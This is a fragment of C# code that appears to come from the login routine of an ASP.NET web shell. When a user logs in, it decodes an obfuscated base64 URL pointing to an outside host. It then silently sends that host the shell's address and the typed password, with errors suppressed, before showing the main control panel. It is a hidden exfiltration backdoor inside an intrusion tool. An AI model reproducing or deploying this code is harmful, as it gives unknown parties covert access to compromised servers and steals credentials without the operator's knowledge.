...
try {WebClient client = new WebClient();client.DownloadData(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String((" a%HR0c%DovL%2EucXNte%".TrimStart().Replace("%", string.Empty) + "Xk#uY29t#L2kucG#hwP3U9 ".TrimEnd().Replace("#", string.Empty)))) + this.Request.Url.ToString() + "|" + this.Bin_TextBox_Login.Text); }catch (Exception) { } 
Bin_Div_Login.Visible=false;
Bin_Main();
}
else
